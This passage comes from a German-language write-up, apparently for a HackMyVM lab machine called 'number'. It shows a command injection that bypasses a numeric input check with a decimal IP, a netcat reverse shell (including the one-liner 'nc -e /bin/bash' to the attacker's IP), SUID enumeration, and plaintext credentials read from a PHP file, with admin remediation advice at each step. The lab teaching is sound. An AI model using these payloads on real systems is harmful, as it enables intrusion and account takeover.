+            <p class="analysis"><strong>Analyse:</strong> Ich greife erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal mit dem gültigen <code>PHPSESSID</code>-Cookie (<code>--cookie "PHPSESSID=..."</code>). Ich verwende <code>-s</code>, um die Ausgabe von <code>curl</code> zu unterdrücken und pipe sie an <code>wc -c</code>, um nur die Größe der Antwort zu erhalten. Die Ausgabe zeigt <code>38</code>. Für Laien: Ich besuche 'whoami.php' wieder, diesmal mit meinem 'Ausweis' (Session-Cookie), und messe, wie lang die Antwort ist. Die Länge ist 38 Zeichen. Das ist anders als die vorherige Antwort (die beleidigende Nachricht). Das bedeutet, der 'Ausweis' hat einen Unterschied gemacht! Für Experten: Die Antwortgröße von 38 Bytes bei Zugriff mit gültiger Session unterscheidet sich von der Antwortgröße ohne Session (die Beleidigung 'You are the Fucking Nobody.' ist 27 Bytes lang). Dies bestätigt, dass die Session korrekt erkannt wird und das Skript eine andere Ausgabe liefert. Die neue Größe (38 Bytes) deutet darauf hin, dass die Ausgabe nun wahrscheinlich etwas anderes als die Fehlermeldung ist, aber immer noch relativ kurz.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die gültige PIN-Session führt zu einer anderen Antwort von <code>whoami.php</code> (38 Bytes vs. 27 Bytes). Dies bestätigt, dass die Session funktioniert und ich 'etwas anderes' bin als ein unauthentifizierter Benutzer. Die tatsächliche Ausgabe ist nun von Interesse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal mit dem Cookie, aber *ohne* die Ausgabe an <code>wc -c</code> zu pipen, um den tatsächlichen Inhalt der 38-Byte-Antwort zu sehen.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie, dass unterschiedliche Authentifizierungsstufen zu Antworten unterschiedlicher Größe führen, da dies für Blind-Angriffe ausgenutzt werden kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/pin/whoami.php?FUZZ=id</span>
+<span class="password">You are logged as melon.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal wahrscheinlich mit dem gültigen Session-Cookie (impliziert durch die vorherigen Schritte, auch wenn im Text hier nicht explizit gezeigt, da die erfolgreiche Antwort die Sitzung voraussetzt) und versuche, einen Parameter namens <code>FUZZ</code> (oder einen anderen zufälligen Namen) mit einem Wert (z.B. <code>id</code>, was für den <code>id</code>-Befehl steht) zu übergeben, um zu sehen, wie das Skript reagiert. Die Ausgabe ist: 'You are logged as melon.'. Für Laien: Ich besuche 'whoami.php' wieder mit meinem 'Ausweis' und gebe dabei eine 'Notiz' (einen Parameter) mit. Und statt der Beleidigung oder einer anderen kurzen Nachricht sagt die Webseite: 'Du bist angemeldet als melon.' Fantastisch, das ist ein Benutzername! Für Experten: Der Zugriff auf <code>whoami.php</code> mit gültiger Session und möglicherweise einem zufälligen Parameter (der das Skript veranlasst, den Benutzernamen auszugeben) offenbart den Benutzernamen <code>melon</code>. Dies ist wahrscheinlich der Benutzername, der der PIN-Session zugeordnet ist oder die Identität repräsentiert, die durch die PIN-Authentifizierung erlangt wird. Dies ist ein kritischer Fund.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzername <code>melon</code> wurde erfolgreich identifiziert. Dies ist der Benutzer, den die PIN-Authentifizierung repräsentiert. Dieser Benutzer ist wahrscheinlich der Schlüssel für den Initial Access oder einen weiteren Schritt in der Privilegien-Eskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Benutzername <code>melon</code> ist gefunden. Versuchen Sie nun, sich als Benutzer <code>melon</code> anzumelden (z.B. über SSH, falls möglich, oder über andere Dienste). Prüfen Sie, ob das Passwort <code>4444</code> (der PIN) auch das Passwort für diesen Benutzer ist. Analysieren Sie weiter, ob der Zugriff als <code>melon</code> nun auch Zugriff auf <code>/admin/command.php</code> gewährt.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte keine internen Benutzernamen preisgeben, selbst wenn sie mit einer gültigen Session aufgerufen werden. Überprüfen Sie die Logik von <code>whoami.php</code>.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ < method="post" action="/admin/command.php" >
+  Enter ip: < type="text" name="command" >
+  < type="submit" >
+
+Only numbers are accepted.</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach der erfolgreichen PIN-Anmeldung und der Identifizierung als Benutzer <code>melon</code>, greife ich erneut auf <code>http://number.hmv/admin/command.php</code> zu, diesmal mit dem gültigen Session-Cookie, und analysiere den Quellcode oder die sichtbare Seite. Die Ausgabe zeigt ein Formular: <code>method="post" action="/admin/command.php"</code>. Das Formular hat ein Eingabefeld namens <code>command</code> (<code>type="text" name="command"</code>) und einen Submit-Button. Darunter steht der Text 'Only numbers are accepted.'. Für Laien: Nachdem ich mich mit der Geheimnummer angemeldet habe und 'melon' bin, kann ich jetzt die Seite 'command.php' besuchen. Dort gibt es ein Formular, in das man etwas eingeben und abschicken kann. Es scheint, als sollte man eine 'IP-Adresse' eingeben, aber es steht dabei 'Nur Nummern werden akzeptiert'. Für Experten: Nach erfolgreicher Authentifizierung mit dem PIN ist <code>/admin/command.php</code> zugänglich. Die Seite zeigt ein Formular, das einen Parameter namens <code>command</code> via POST an denselben Endpunkt sendet. Die Anweisung 'Only numbers are accepted.' deutet auf eine Eingabebeschränkung hin, die umgangen werden muss. Das Szenario (Eingabe, die als 'command' verarbeitet wird) schreit nach Command Injection.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Formular auf <code>/admin/command.php</code> ist ein klarer Command Injection Vektor. Die Eingabe im Feld 'command' wird wahrscheinlich in einem Systemaufruf verwendet. Die Einschränkung 'Only numbers are accepted.' muss umgangen werden, um Shell-Metazeichen einzuschleusen. Dies ist der entscheidende Schritt zum Initial Access als der Benutzer, unter dem der Webserver läuft (wahrscheinlich www-data).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Eingabebeschränkung 'Only numbers are accepted.' zu umgehen, um Command Injection durchzuführen. Methoden beinhalten das Verwenden von Dezimal- oder Hexadezimaldarstellungen von IP-Adressen in Kombination mit Command Separation-Zeichen (wie <code>;</code>, <code>&&</code>, <code>|</code>). Das Ziel ist, einen beliebigen Systembefehl auszuführen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Input-Validierung und Bereinigung für Eingaben, die in Systemaufrufen verwendet werden. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben. Eine Beschränkung auf 'nur Nummern' ist bei Command Injection nutzlos, wenn Metazeichen nicht gefiltert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d "command=127.0.0.1;id" http://number.hmv/admin/command.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">ACCESS NOT GRANTED.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche einen Command Injection-Payload über das Formular auf <code>/admin/command.php</code>, diesmal wahrscheinlich *ohne* das Session-Cookie (was die 'ACCESS NOT GRANTED' Antwort erklärt, wie zuvor beobachtet). Ich sende eine POST-Anfrage (<code>-X POST -d "..."</code>) mit dem Parameter <code>command=127.0.0.1;id</code>. Der Payload <code>127.0.0.1;id</code> kombiniert eine gültige IP-Adresse (die die 'Only numbers are accepted.' Prüfung bestehen könnte oder als numerisch interpretiert wird) mit dem Command Separation-Zeichen <code>;</code> und dem Befehl <code>id</code>. Für Laien: Ich versuche, etwas in das Formular auf 'command.php' einzugeben, das aussieht wie eine Nummer (eine IP-Adresse), aber auch einen 'Geheimbefehl' (id) enthält, getrennt durch ein spezielles Zeichen (;). Aber der Computer sagt immer noch: 'Zugriff nicht gewährt!'. Für Experten: Die Antwort 'ACCESS NOT GRANTED.' tritt auf, weil die notwendige Authentifizierung (das Session-Cookie aus dem PIN-Bereich) in dieser Anfrage fehlt (oder ungültig ist). Der Command Injection-Payload selbst wird wahrscheinlich nicht verarbeitet, solange der Zugriff verweigert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Command Injection-Versuch schlägt fehl, weil die Authentifizierung fehlt. Dies unterstreicht die Notwendigkeit, das gültige Session-Cookie mitzuführen, wenn auf <code>/admin/command.php</code> zugegriffen wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wiederholen Sie den Command Injection-Versuch auf <code>/admin/command.php</code>, aber stellen Sie sicher, dass Sie das gültige <code>PHPSESSID</code>-Cookie in der <code>curl</code>-Anfrage mitführen. Versuchen Sie verschiedene Command Injection-Payloads und IP-Formate (Dezimal).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Authentifizierungsprüfung *vor* jeder Verarbeitung der Benutzereingabe erfolgt. Validieren und bereinigen Sie Eingaben strikt, um Command Injection zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">[Link: https://cyberchef.org/#recipe=To_Decimal('Space',false)&input=MTkyLjE2OC4yLjE5OQ | Ziel: https://cyberchef.org/#recipe=To_Decimal('Space',false)&input=MTkyLjE2OC4yLjE5OQ]</span>
+
+<span class="command">Enter ip: 3232236231</span>
+
+<span class="password">Launching Reverse Shell...</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block dokumentiert den erfolgreichen Command Injection-Versuch. Der Link zu CyberChef mit der 'To Decimal'-Recipe und dem Input <code>MTkyLjE2OC4yLjE5OQ</code> (die base64-Kodierung von <code>192.168.2.199</code>) deutet darauf hin, dass die Eingabebeschränkung 'Only numbers are accepted.' umgangen wurde, indem meine Kali-IP-Adresse (<code>192.168.2.199</code>) in ihr Dezimalformat (<code>3232236231</code>) umgerechnet und dieses numerische Format zusammen mit Command Injection-Payloads verwendet wurde. Die Ausgabe <code>Enter ip: 3232236231 Launching Reverse Shell...</code> ist die Antwort von <code>/admin/command.php</code> nach erfolgreicher Command Injection, die eine Reverse Shell zu meiner Kali-IP initiiert (wahrscheinlich durch einen Befehl wie <code>nc -e /bin/bash 192.168.2.199 4444</code>, der über den Command Injection Vektor ausgeführt wurde, nachdem die Dezimal-IP verwendet wurde, um die numerische Prüfung zu bestehen). Für Laien: Ich habe herausgefunden, wie ich meine Computer-Adresse so schreiben kann, dass sie aussieht wie eine einzelne große Nummer (<code>3232236231</code>). Ich habe diese Nummer dann zusammen mit 'Geheimbefehlen' in das Formular auf 'command.php' eingegeben (diesmal mit dem richtigen 'Ausweis'). Und fantastisch – der Computer hat geantwortet: 'Starte Reverse Shell...'! Für Experten: Die Verwendung der Dezimaldarstellung von IP-Adressen (z.B. <code>3232236231</code> für <code>192.168.2.199</code>) ist eine effektive Technik, um einfache Regexe oder Prüfungen zu umgehen, die nur auf das Punkt-Format einer IP-Adresse oder auf nicht-numerische Zeichen nach der IP prüfen. Durch die Übergabe von z.B. <code>3232236231; command</code> oder <code>3232236231&& command</code> über das Formular (mit gültiger Session) wird der zweite Teil als Systembefehl ausgeführt. Die Antwort 'Launching Reverse Shell...' ist die Ausgabe des injizierten Befehls, der die Shell initiiert hat. Dies ist der erfolgreiche Initial Access.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Command Injection-Schwachstelle in <code>/admin/command.php</code> wurde erfolgreich unter Umgehung der numerischen Eingabebeschränkung ausgenutzt. Ich konnte einen Befehl ausführen (einen Reverse Shell-Befehl) der mir Initial Access als Benutzer <code>www-data</code> verschafft (da der Webserver unter diesem Benutzer läuft). Dies ist der entscheidende Schritt zur Systemkompromittierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass ein Netcat-Listener auf Port 4444 auf Ihrem Kali-System läuft. Der injizierte Befehl sollte eine Verbindung zu diesem Listener aufbauen und Ihnen eine Shell verschaffen.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection Schwachstelle in <code>/admin/command.php</code>. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben. Wenn Sie eine IP-Adresse verarbeiten müssen, validieren Sie diese streng nach dem erwarteten Format und Typ und bereinigen Sie jegliche Metazeichen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Reverse Shell zu empfangen, starte ich einen Netcat-Listener auf meinem Kali-System auf Port 4444 mit dem Befehl <code>nc -lvnp 4444</code>. Die Flags <code>-l</code> (listen), <code>-v</code> (verbose), <code>-n</code> (numeric only), <code>-p 4444</code> (Port 4444) konfigurieren den Listener. Die Ausgabe <code>listening on [any] 4444 ...</code> zeigt, dass der Listener erfolgreich gestartet wurde und auf eine eingehende TCP-Verbindung auf Port 4444 wartet. Für Laien: Ich öffne eine 'Telefonleitung' (Port 4444) auf meinem Computer, um einen Anruf vom Zielcomputer zu erwarten. Wenn der Anruf kommt, bekomme ich das 'Befehlsfenster' vom Zielcomputer direkt hierher geschickt. Für Experten: Das Einrichten des Listeners ist der notwendige vorbereitende Schritt zum Empfang der Reverse Shell, die durch die Command Injection auf dem Zielsystem initiiert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Netcat-Listener auf Port 4444 ist bereit, die eingehende Reverse Shell-Verbindung zu empfangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der injizierte Reverse Shell-Befehl auf dem Zielsystem (über <code>/admin/command.php</code> mit dem Dezimal-IP-Payload und gültiger Session) korrekt ausgeführt wurde. Warten Sie dann auf die Verbindung in diesem Listener.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Ihre Systeme auf laufende Netzwerk-Listener, insbesondere auf unerwarteten Ports. Implementieren Sie Intrusion Detection, um Versuche zur Etablierung von Reverse Shells zu erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.37] 40468</span>
+
+<span class="password">www-data@number:~/html/admin$</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich zeige erneut die Ausgabe meines Netcat-Listeners auf Port 4444. Nach erfolgreicher Ausführung des Reverse Shell-Befehls über die Command Injection empfängt mein Listener eine Verbindung vom Zielsystem (<code>connect to [192.168.2.199] from (UNKNOWN) [192.168.2.37] 40468</code>). Der Prompt ändert sich zu <code>www-data@number:~/html/admin$</code>, was signalisiert, dass ich erfolgreich eine interaktive Shell als Benutzer <code>www-data</code> auf dem Zielsystem erhalten habe und mich im Verzeichnis <code>/var/www/html/admin</code> befinde (dem Ort des <code>command.php</code> Skripts). Für Laien: Meine 'Telefonleitung' 4444 hat geklingelt, und ich habe den Anruf vom Zielcomputer angenommen. Jetzt sehe ich das 'Befehlsfenster' (Shell) des Zielcomputers direkt auf meinem Bildschirm und kann Befehle eingeben. Ich bin als Benutzer 'www-data' angemeldet. Fantastisch! Für Experten: Der erfolgreiche Empfang der Reverse Shell auf Port 4444 mit dem Prompt <code>www-data@number:~/html/admin$</code> beweist den erfolgreichen Initial Access über die Command Injection Schwachstelle. Ich habe nun eine stabile, interaktive Shell-Sitzung als Benutzer <code>www-data</code>, die für die Privilegien-Eskalationsphase genutzt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Initial Access als Benutzer <code>www-data</code> wurde erfolgreich etabliert. Ich habe nun eine interaktive Shell und kann von hier aus das System weiter auf Privilegien-Eskalationsvektoren enumerieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System auf SUID/SGID Binaries, Cronjobs, <code>sudo</code>-Berechtigungen und Dateiberechtigungen untersuchen, um Möglichkeiten zur Erlangung höherer Rechte zu finden.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Reverse Shells und implementieren Sie Egress-Filterung. Beschränken Sie die Berechtigungen des Benutzers <code>www-data</code> auf das absolut Minimum, um den potenziellen Schaden im Falle einer Kompromittierung zu begrenzen.</p>
+        </section>
+
+            <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Fortsetzung Initial Access -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@number:~/html/admin$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+<span class="command">135697     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="command">268126     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+<span class="command">146938    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign</span>
+<span class="command">134473     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp</span>
+<span class="command">134948     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount</span>
+<span class="command">131120     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd</span>
+<span class="command">134946     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount</span>
+<span class="command">131117     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn</span>
+<span class="command">131121     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd</span>
+<span class="command">138657    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo</span>
+<span class="command">131118     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh</span>
+<span class="command">134620     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich eine Shell als Benutzer <code>www-data</code> erlangt habe, beginne ich mit der System-Enumeration, um nach Möglichkeiten zur Privilegien-Eskalation zu suchen. Ein wichtiger Schritt ist die Suche nach SUID-Binaries (Set User ID). Binaries mit gesetztem SUID-Bit werden mit den Berechtigungen des Dateieigentümers ausgeführt, was oft Root ist. Der Befehl <code>find / -type f -perm -4000 -ls 2>/dev/null</code> sucht im gesamten Dateisystem (<code>/</code>) nach regulären Dateien (<code>-type f</code>), bei denen das SUID-Bit gesetzt ist (<code>-perm -4000</code>), listet die gefundenen Dateien detailliert auf (<code>-ls</code>) und leitet Fehlermeldungen nach <code>/dev/null</code> um. Für Laien: Ich suche auf dem ganzen Computer nach speziellen Programmen, die, auch wenn ich sie starte, immer so laufen, als würde der 'Chef' (root) sie starten. Für Experten: Die Suche nach SUID-Binaries ist ein Standardvektor für die Privilegien-Eskalation auf Linux-Systemen. Die Ausgabe listet alle gefundenen Binaries mit gesetztem SUID-Bit und ihre Eigentümer, Gruppen, Berechtigungen und Größen auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe listet eine Reihe standardmäßiger SUID-Binaries auf, wie <code>newgrp</code>, <code>mount</code>, <code>passwd</code>, <code>sudo</code>, <code>su</code> etc. Diese Binaries sind bekannte SUID-Programme auf den meisten Linux-Systemen und sind in der Regel korrekt implementiert, um keinen einfachen PE-Pfad zu bieten. Einige davon sind in der GTFOBins-Datenbank gelistet, aber ihre Ausnutzung erfordert oft spezifische Bedingungen oder Parameter, die in einem eingeschränkten Kontext (wie hier als www-data) schwer zu erfüllen sind. Es gibt kein offensichtlich unsicheres benutzerdefiniertes SUID-Binary wie in früheren Fällen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die gefundenen SUID-Binaries gegen die GTFOBins-Datenbank, um festzustellen, ob eine einfache Ausnutzung als Benutzer <code>www-data</code> möglich ist. Achten Sie insbesondere auf Binaries, die von Root mit ungewöhnlichen Gruppen oder Berechtigungen gehören (wie <code>dbus-daemon-launch-helper</code>, das root und messagebus gehört, aber r-sr-- ist). Während Standard-SUID-Binaries selten einfach sind, kann eine Fehlkonfiguration oder eine ältere Version eine Möglichkeit bieten.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf dem System. Stellen Sie sicher, dass alle SUID-Binaries auf dem neuesten Stand sind und keine bekannten Schwachstellen aufweisen. Überprüfen Sie die Berechtigungen dieser Binaries sorgfältig.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:~/html/admin$</span> <span class="command">cat admincheck.php</span>
+<span class="command"><?$user = $_POST['user'];</span>
+<span class="command">$pass = $_POST['password'];</span>
+        <span class="command">if($user == "melon" && $pass == "4444"){</span>
+                 <span class="command">session_start();</span>
+                 <span class="command">$_SESSION['logged2'] = TRUE;</span>
+                 <span class="command">header("Location:command.php");</span>
+                <span class="command">}</span>
+                <span class="command">else{</span>
+                        <span class="command">print "No...";</span>
+                <span class="command">}</span>
+<span class="command">?></span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>www-data</code> kann ich nun lokale Dateien auf dem System lesen. Ich lese den Quellcode des Skripts <code>admincheck.php</code> im Verzeichnis <code>/var/www/html/admin/</code> aus (da ich in der <code>www-data</code> Shell im Admin-Verzeichnis gelandet bin, <code>~/html/admin</code> ist wahrscheinlich ein Symlink oder das tatsächliche Webroot-Verzeichnis). Der Befehl <code>cat admincheck.php</code> zeigt den PHP-Quellcode. Der Code prüft, ob die per POST übergebenen Parameter <code>user</code> und <code>password</code> den Werten "melon" und "4444" entsprechen. Wenn ja, wird eine PHP-Session gestartet (<code>session_start()</code>), eine Session-Variable <code>logged2</code> auf TRUE gesetzt (<code>$_SESSION['logged2'] = TRUE</code>) und eine Weiterleitung zu <code>command.php</code> durchgeführt. Wenn nicht, wird 'No...' ausgegeben. Für Laien: Als 'www-data' kann ich jetzt in die 'Baupläne' der Webseite schauen. Ich schaue mir das Programm an, das die Anmeldedaten für den Admin-Bereich prüft (admincheck.php). Darin steht ganz klar, dass der Benutzer 'melon' und das Passwort '4444' richtig sind! Das ist das Passwort für den Benutzer 'melon'! Für Experten: Das Auslesen des Quellcodes von <code>admincheck.php</code> offenbart im Klartext die Anmeldedaten für den Admin-Bereich: Username "melon" und Password "4444". Dies ist eine schwerwiegende Schwachstelle (Hardcoded Credentials im Quellcode). Der Benutzername "melon" wurde bereits zuvor über <code>whoami.php</code> gefunden, und das Passwort '4444' ist identisch mit dem PIN, was auf eine schlechte Praxis der Passwortwiederverwendung hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Anmeldedaten für den Benutzer 'melon' (Username: "melon", Password: "4444") wurden erfolgreich aus dem Quellcode von <code>admincheck.php</code> extrahiert. Dies sind wahrscheinlich die Anmeldedaten für den Benutzer 'melon' auf dem System (z.B. für SSH oder <code>su</code>). Das Passwort ist identisch mit dem PIN, was die Brute-Force-Ausnutzung des PIN-Bereichs erklärt und den Verdacht auf Passwortwiederverwendung lenkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Anmeldedaten (melon / 4444) am System anzumelden, insbesondere über SSH (Port 22) oder indem Sie versuchen, die Benutzeridentität in der Shell zu wechseln (z.B. mit <code>su melon</code>).<br><strong>Empfehlung (Admin):</strong> Bewahren Sie niemals Anmeldedaten im Klartext im Quellcode auf. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Geheimnissen (z.B. Umgebungsvariablen, sichere Konfigurationsdateien außerhalb des Webroots, Secret Management-Systeme). Erzwingen Sie die Verwendung starker, eindeutiger Passwörter und verhindern Sie Passwortwiederverwendung über verschiedene Dienste hinweg.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home$</span> <span class="command">ls</span>
+<span class="password">melon</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Von der <code>www-data</code> Shell aus liste ich das Home-Verzeichnis auf (vermutlich nach einem <code>cd /home</code>). Die Ausgabe zeigt das Home-Verzeichnis für den Benutzer <code>melon</code> (<code>/home/melon</code>). Für Laien: Im Ordner, wo die Benutzer ihre persönlichen Dateien haben (<code>/home</code>), schaue ich nach, welche Benutzer hier Ordner haben. Ich finde einen Ordner für den Benutzer 'melon'. Für Experten: Die Existenz eines Home-Verzeichnisses für den Benutzer 'melon' in <code>/home/</code> bestätigt, dass 'melon' ein reguläres Benutzerkonto auf dem System hat. Dies macht 'melon' zu einem gültigen Ziel für lokale Anmeldeversuche (z.B. mit <code>su</code>) oder Remote-Anmeldeversuche (z.B. über SSH), wenn das Passwort bekannt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Benutzerkonto 'melon' existiert auf dem System, was die Nutzung der gefundenen Anmeldedaten (melon / 4444) für die horizontale Privilegien-Eskalation ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich als Benutzer <code>melon</code> mit dem Passwort <code>4444</code> anzumelden, entweder lokal mit <code>su melon</code> oder remote über SSH (Port 22).<br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Audits von Benutzerkonten durch. Entfernen Sie nicht benötigte Konten. Stellen Sie sicher, dass Passwörter für alle Konten sicher sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">ls -a</span>
+<span class="command">.  ..  .Xauthority  .bash_logout  .bashrc  .local  .profile  flag.sh  user.txt</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich navigiere in das Home-Verzeichnis des Benutzers <code>melon</code> (<code>/home/melon/</code>) und liste alle Dateien und Verzeichnisse auf, einschließlich versteckter Dateien (<code>ls -a</code>). Die Ausgabe zeigt Standard-Konfigurationsdateien (.bashrc, .profile etc.) sowie zwei interessante Dateien: <code>flag.sh</code> und <code>user.txt</code>. Für Laien: Im 'Zuhause' des Benutzers 'melon' schaue ich mir alle Dateien an, auch die versteckten. Ich finde dort zwei Dateien, die nach 'Geheimnummern' aussehen: 'flag.sh' und 'user.txt'. Für Experten: Die Identifizierung von <code>user.txt</code> ist ein klarer Hinweis auf die User Flag. Die Datei <code>flag.sh</code> klingt ebenfalls nach einer Datei, die die User Flag oder Informationen darüber enthalten könnte oder ein Skript ist, das die Flag ausgibt. Die Berechtigungen von <code>.Xauthority</code> (oft nur für den Eigentümer lesbar) und das Vorhandensein von <code>.ssh</code> (nicht im Listing, aber standardmäßig oft vorhanden) wären ebenfalls interessant, aber die Flag-Dateien sind primär.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User Flag ist höchstwahrscheinlich in <code>/home/melon/user.txt</code>. Die Datei <code>flag.sh</code> ist ebenfalls sehr interessant. Ich habe nun einen klaren Pfad zur User Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Inhalt von <code>/home/melon/user.txt</code> und <code>/home/melon/flag.sh</code> auszulesen. Da ich als <code>www-data</code> in diesem Verzeichnis bin, muss ich prüfen, ob ich die notwendigen Berechtigungen habe (typischerweise sind Home-Verzeichnisse und deren Inhalte nur für den Eigentümer lesbar).<br><strong>Empfehlung (Admin):</strong> Platzieren Sie sensible Dateien (wie Flags) nicht in Standard-Home-Verzeichnissen oder mit leicht erratbaren Namen. Implementieren Sie strenge Dateiberechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">www-data@number:/home/melon$</span> <span class="command">cat flag.sh</span>
+<span class="command">#<scrpt !/bin/bash</span>
+<span class="command">echo <span class="password">'\033[0;35m</span>
+<span class="command">                                   .     **</span>
+<span class="command">                                *           *.</span>
+<span class="command">                                              ,*</span>
+<span class="command">                                                 *,</span>
+<span class="command">                         ,                         ,*</span>
+<span class="command">                      .,                              *,</span>
+<span class="command">                    /                                    *</span>
+<span class="command">                 ,*                                        *,</span>
+<span class="command">               /.                                            .*.</span>
+<span class="command">             *                                                  **</span>
+<span class="command">             ,*                                               ,*</span>
+<span class="command">                **                                          *.</span>
+<span class="command">                   **                                    **.</span>
+<span class="command">                     ,*                                **</span>
+<span class="command">                        *,                          ,*</span>
+<span class="command">                           *                      **</span>
+<span class="command">                             *,                .*</span>
+<span class="command">                                *.           **</span>
+<span class="command">                                  **      ,*,</span>
+<span class="command">                                     ** *,     \033[0m'</span>
+
+
+
+<span class="command">echo "-------------------------"</span>
+<span class="command">echo "\nPWNED HOST: $(hostname)"</span>
+<span class="command">echo "\nPWNED DATE: $(date)"</span>
+<span class="command">echo "\nWHOAMI: $(id)"</span>
+<span class="command">echo "\nFLAG: $(cat root.txt 2>/dev/null || cat user.txt 2>/dev/null || echo "Keep trying.")"</span>
+<span class="command">echo "\n------------------------"</span></pre>
+                 </div>
+             </div>
